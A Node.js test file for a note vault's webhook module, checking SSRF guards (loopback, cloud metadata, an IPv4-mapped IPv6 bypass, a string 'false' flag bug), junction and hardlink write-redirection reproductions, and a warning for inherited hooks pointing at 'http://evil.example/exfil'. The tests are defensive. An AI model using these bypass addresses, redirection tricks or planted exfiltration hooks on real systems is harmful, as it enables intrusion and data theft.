'use strict';

const { test, describe, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const { validateHookUrl, addHook, removeHook, readHooks, checkInheritedWebhooks, createWebhookDispatcher } = require('../src/runtime/webhooks');
const { postJsonWebhook } = require('../src/runtime/webhookHttp');

describe('webhooks — validateHookUrl', () => {
    test('accepts an ordinary https URL', () => {
        assert.equal(validateHookUrl('https://example.com/hook').ok, true);
    });

    test('rejects non-http(s) schemes', () => {
        assert.equal(validateHookUrl('ftp://example.com/hook').ok, false);
        assert.equal(validateHookUrl('file:///etc/passwd').ok, false);
    });

    test('rejects an empty or unparseable URL', () => {
        assert.equal(validateHookUrl('').ok, false);
        assert.equal(validateHookUrl('not a url').ok, false);
    });

    test('rejects localhost and an IP-literal loopback address up front, for fast feedback', () => {
        assert.equal(validateHookUrl('http://localhost/hook').ok, false);
        assert.equal(validateHookUrl('http://127.0.0.1/hook').ok, false);
        assert.equal(validateHookUrl('http://[::1]/hook').ok, false);
    });

    test('rejects the cloud metadata address up front', () => {
        assert.equal(validateHookUrl('http://169.254.169.254/latest/meta-data/').ok, false);
    });

    test('rejects other IP-literal private ranges up front', () => {
        assert.equal(validateHookUrl('http://10.0.0.5/hook').ok, false);
        assert.equal(validateHookUrl('http://192.168.1.1/hook').ok, false);
    });

    test('a non-IP hostname is accepted here — real enforcement happens at delivery time via safeLookup, not registration', () => {
        // A hostname like internal.corp.example cannot be judged synchronously
        // without a DNS lookup, and a hostname that resolves safely today could
        // be rebound to a private address later. validateHookUrl is a fast,
        // best-effort convenience check only — postJsonWebhook's safeLookup
        // (exercised below) is the real, authoritative gate.
        assert.equal(validateHookUrl('https://internal.example.com/hook').ok, true);
    });

    describe('the allowLocal opt-in', () => {
        test('without allowLocal, loopback and localhost are still rejected', () => {
            assert.equal(validateHookUrl('http://127.0.0.1/hook', { allowLocal: false }).ok, false);
            assert.equal(validateHookUrl('http://localhost/hook', { allowLocal: false }).ok, false);
        });

        test('with allowLocal, loopback and localhost are accepted', () => {
            assert.equal(validateHookUrl('http://127.0.0.1:4000/hook', { allowLocal: true }).ok, true);
            assert.equal(validateHookUrl('http://localhost:4000/hook', { allowLocal: true }).ok, true);
            assert.equal(validateHookUrl('http://[::1]:4000/hook', { allowLocal: true }).ok, true);
        });

        test('allowLocal does not widen the exemption to a real LAN address', () => {
            assert.equal(validateHookUrl('http://192.168.1.1/hook', { allowLocal: true }).ok, false);
            assert.equal(validateHookUrl('http://169.254.169.254/latest/meta-data/', { allowLocal: true }).ok, false);
        });
    });
});

describe('webhooks — addHook end to end', () => {
    let vaultDir;

    beforeEach(() => {
        vaultDir = fs.mkdtempSync(path.join(os.tmpdir(), 'yamlink-webhooks-'));
    });

    afterEach(() => {
        fs.rmSync(vaultDir, { recursive: true, force: true });
    });

    test('a hook pointed at a private address is rejected before ever being persisted', () => {
        const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
        const result = addHook(vaultDir, { event, url: 'http://127.0.0.1:9999/evil' });
        assert.equal(result.ok, false);
        assert.deepEqual(readHooks(vaultDir), []);
    });

    test('a legitimate hook is persisted normally', () => {
        const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
        const result = addHook(vaultDir, { event, url: 'https://example.com/hook' });
        assert.equal(result.ok, true);
        assert.equal(readHooks(vaultDir).length, 1);
    });

    test('a hook pointed at loopback is rejected without the opt-in, persisted with it, and the flag survives to disk', () => {
        const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
        const rejected = addHook(vaultDir, { event, url: 'http://127.0.0.1:4000/my-script' });
        assert.equal(rejected.ok, false);

        const accepted = addHook(vaultDir, { event, url: 'http://127.0.0.1:4000/my-script', allowLocal: true });
        assert.equal(accepted.ok, true);
        assert.equal(accepted.hook.allowLocal, true);
        assert.equal(readHooks(vaultDir)[0].allowLocal, true);
    });

    test('allowLocal on a hook does not help a LAN-address hook get persisted', () => {
        const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
        const result = addHook(vaultDir, { event, url: 'http://192.168.1.1:4000/x', allowLocal: true });
        assert.equal(result.ok, false);
        assert.deepEqual(readHooks(vaultDir), []);
    });

    test('real exploit reproduction: the literal string "false" for allowLocal must not be treated as true', () => {
        // This is the real, reachable entry point for the bug (an API
        // caller's JSON body can contain the string "false", not just a
        // real boolean) — proven here at addHook, not just at the
        // coerceAllowLocal helper in isolation.
        const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
        const result = addHook(vaultDir, { event, url: 'http://127.0.0.1:4000/my-script', allowLocal: 'false' });
        assert.equal(result.ok, false, 'allowLocal: "false" must NOT be treated as an opt-in — a loopback hook must still be rejected');
        assert.deepEqual(readHooks(vaultDir), []);
    });

    test('real exploit reproduction (third-round Codex finding): webhooks.json is never written through a .yamlink directory junction redirecting outside the vault', (t) => {
        const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'yamlink-webhooks-junction-outside-'));
        try {
            try {
                fs.symlinkSync(outsideDir, path.join(vaultDir, '.yamlink'), 'junction');
            } catch (error) {
                if (error && (error.code === 'EPERM' || error.code === 'EACCES')) {
                    t.skip('junction creation not permitted in this environment');
                    return;
                }
                throw error;
            }
            const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
            const result = addHook(vaultDir, { event, url: 'https://example.com/hook' });
            assert.equal(result.ok, false, 'a poisoned .yamlink junction must cause a clean failure, not a throw and not a silent write elsewhere');
            assert.equal(fs.existsSync(path.join(outsideDir, 'webhooks.json')), false, 'webhooks.json must never be written into the attacker-controlled directory the junction points at');
        } finally {
            fs.rmSync(outsideDir, { recursive: true, force: true });
        }
    });

    test('real exploit reproduction (third-round Codex finding): writing webhooks.json never corrupts a file it shares an inode with via hardlink', (t) => {
        const victimPath = path.join(os.tmpdir(), `yamlink-webhooks-victim-${Date.now()}-${Math.random().toString(16).slice(2)}.json`);
        fs.writeFileSync(victimPath, 'important unrelated content');
        try {
            fs.mkdirSync(path.join(vaultDir, '.yamlink'), { recursive: true });
            try {
                fs.linkSync(victimPath, path.join(vaultDir, '.yamlink', 'webhooks.json'));
            } catch (error) {
                if (error && (error.code === 'EPERM' || error.code === 'EXDEV')) {
                    t.skip('hardlink creation not permitted/possible in this environment');
                    return;
                }
                throw error;
            }
            const victimInodeBefore = fs.statSync(victimPath).ino;

            const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
            const result = addHook(vaultDir, { event, url: 'https://example.com/hook' });

            assert.equal(result.ok, true);
            assert.equal(fs.readFileSync(victimPath, 'utf8'), 'important unrelated content', 'the hardlinked victim file must remain untouched');
            assert.equal(fs.statSync(victimPath).ino, victimInodeBefore);
            assert.notEqual(fs.statSync(path.join(vaultDir, '.yamlink', 'webhooks.json')).ino, victimInodeBefore, 'webhooks.json must now be a fresh, independent file');
        } finally {
            fs.rmSync(victimPath, { force: true });
        }
    });
});

describe('webhooks — postJsonWebhook real SSRF exploit reproduction', () => {
    // Real, confirmed vulnerability (not theoretical): postJsonWebhook builds
    // its own http/https request straight from a stored URL with no
    // destination-address check at all — a webhook pointed at 127.0.0.1 (or
    // any other internal address) would reach it. Proves the actual fix
    // (safeLookup wired into the request's `lookup` option) really refuses
    // the connection, not just that the pure address-classification table
    // says it should.
    test('a webhook URL pointing at a real local server never reaches it — the request is refused before connecting', async () => {
        let serverWasHit = false;
        const server = http.createServer((_req, res) => {
            serverWasHit = true;
            res.writeHead(200);
            res.end('ok');
        });
        await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;

        try {
            const result = await postJsonWebhook(`http://127.0.0.1:${port}/internal-admin-action`, { hello: 'world' });
            assert.equal(result.ok, false);
            assert.match(result.error, /private\/internal address/);
            assert.equal(serverWasHit, false, 'the local server must never have actually received the request');
        } finally {
            await new Promise((resolve) => server.close(resolve));
        }
    });
    // A "public address still works" integration case is deliberately not
    // included here: every reachable non-loopback interface on a real
    // machine is typically itself a private LAN address (192.168.x.x,
    // 10.x.x.x), which safeLookup correctly refuses too — there's no address
    // this test could bind to locally that both actually receives a
    // connection and isn't itself in a blocked range. The "ordinary public
    // address is allowed" property is already covered, without a real
    // network dependency, by ssrfGuard.test.js's `isBlockedAddress`/
    // `safeLookup` unit tests.

    test('real exploit reproduction: a pure-hex IPv4-mapped IPv6 literal pointing at loopback is refused, not just the dotted-decimal form', async () => {
        // Real, confirmed bypass (external security review): an earlier
        // version of the underlying address classifier only unwrapped the
        // dotted-decimal embedded-IPv4 form (`::ffff:127.0.0.1`) via regex.
        // The exact same address also has a fully valid pure-hex
        // representation per RFC 4291 (`::ffff:7f00:1`), which that regex
        // never matched — confirmed independently delivered to a real
        // local server with no allowLocal opt-in before this fix. Proven
        // here at the real postJsonWebhook layer, not just the pure
        // address-classifier unit tests in ssrfGuard.test.js.
        let serverWasHit = false;
        const server = http.createServer((_req, res) => {
            serverWasHit = true;
            res.writeHead(200);
            res.end('ok');
        });
        await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;

        try {
            const result = await postJsonWebhook(`http://[::ffff:7f00:1]:${port}/internal-admin-action`, { hello: 'world' });
            assert.equal(result.ok, false);
            assert.match(result.error, /private\/internal address/, `expected an SSRF refusal, got: ${result.error}`);
            assert.equal(serverWasHit, false, 'the local server must never have actually received the request');
        } finally {
            await new Promise((resolve) => server.close(resolve));
        }
    });

    test('with allowLocal: true, a webhook URL pointing at a real local server actually receives the request', async () => {
        let received = null;
        const server = http.createServer((req, res) => {
            let body = '';
            req.on('data', (chunk) => { body += chunk; });
            req.on('end', () => {
                received = JSON.parse(body);
                res.writeHead(200);
                res.end('ok');
            });
        });
        await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;

        try {
            const result = await postJsonWebhook(`http://127.0.0.1:${port}/my-script`, { hello: 'world' }, { allowLocal: true });
            assert.equal(result.ok, true);
            assert.deepEqual(received, { hello: 'world' });
        } finally {
            await new Promise((resolve) => server.close(resolve));
        }
    });

    test('allowLocal: true does not open the door to a real LAN-shaped address — only loopback', async () => {
        // 192.168.1.1 isn't guaranteed reachable or unreachable on every test
        // host, so this isn't about a real connection attempt; it's a direct
        // proof that the SSRF-refusal message still fires even with the flag
        // set, which is the one thing that must never regress.
        const result = await postJsonWebhook('http://192.168.1.1:1/x', { hello: 'world' }, { allowLocal: true });
        assert.equal(result.ok, false);
        assert.match(result.error, /private\/internal address/);
    });
});

describe('inherited-webhook caution warning — built for the user\'s explicit "it\'s important for caution purpose" request', () => {
    let vaultDir;

    beforeEach(() => {
        vaultDir = fs.mkdtempSync(path.join(os.tmpdir(), 'yamlink-webhooks-inherited-'));
    });

    afterEach(() => {
        fs.rmSync(vaultDir, { recursive: true, force: true });
    });

    test('a vault whose webhooks.json already existed before this install ever touched it is flagged inherited', () => {
        fs.mkdirSync(path.join(vaultDir, '.yamlink'), { recursive: true });
        fs.writeFileSync(path.join(vaultDir, '.yamlink', 'webhooks.json'), JSON.stringify([
            { id: 'hook-1', url: 'http://evil.example/exfil', event: 'note_created', enabled: true, allowLocal: false }
        ]));

        const result = checkInheritedWebhooks(vaultDir);
        assert.equal(result.inherited, true);
        assert.equal(result.hooks.length, 1);
        assert.equal(result.hooks[0].id, 'hook-1');
    });

    test('a hook added through addHook itself (a brand new vault, never had pre-existing webhooks.json) is never flagged inherited', () => {
        const [event] = require('../src/runtime/mutationEventTypes').MUTATION_EVENT_TYPES.keys();
        const result = addHook(vaultDir, { event, url: 'https://example.com/my-own-hook' });
        assert.equal(result.ok, true);

        const check = checkInheritedWebhooks(vaultDir);
        assert.equal(check.inherited, false, 'a hook the user adds themselves through the normal app must never be mistaken for an inherited one');
    });

    test('the warning naturally stops once every inherited hook is removed, with no separate acknowledgement step needed', () => {
        fs.mkdirSync(path.join(vaultDir, '.yamlink'), { recursive: true });
        fs.writeFileSync(path.join(vaultDir, '.yamlink', 'webhooks.json'), JSON.stringify([
            { id: 'hook-1', url: 'http://evil.example/exfil', event: 'note_created', enabled: true, allowLocal: false }
        ]));

        assert.equal(checkInheritedWebhooks(vaultDir).inherited, true);
        removeHook(vaultDir, 'hook-1');
        assert.equal(checkInheritedWebhooks(vaultDir).inherited, false, 'removing the only inherited hook must silence the warning, even though the vault\'s origin marker still says inherited');
    });

    test('createWebhookDispatcher logs a real warning naming the inherited hook at startup', () => {
        fs.mkdirSync(path.join(vaultDir, '.yamlink'), { recursive: true });
        fs.writeFileSync(path.join(vaultDir, '.yamlink', 'webhooks.json'), JSON.stringify([
            { id: 'hook-inherited-1', url: 'http://evil.example/exfil', event: 'note_created', enabled: true, allowLocal: false }
        ]));

        const warnings = [];
        const fakeLogger = { warn: (msg) => warnings.push(msg) };
        const fakeVaultService = { onRebuild: () => () => {} };

        createWebhookDispatcher({ vaultPath: vaultDir, vaultService: fakeVaultService, logger: fakeLogger });

        assert.equal(warnings.length, 1);
        assert.match(warnings[0], /hook-inherited-1/);
        assert.match(warnings[0], /http:\/\/evil\.example\/exfil/);
    });

    test('createWebhookDispatcher does not warn for an ordinary vault with no inherited hooks', () => {
        const warnings = [];
        const fakeLogger = { warn: (msg) => warnings.push(msg) };
        const fakeVaultService = { onRebuild: () => () => {} };

        createWebhookDispatcher({ vaultPath: vaultDir, vaultService: fakeVaultService, logger: fakeLogger });

        assert.equal(warnings.length, 0);
    });
});
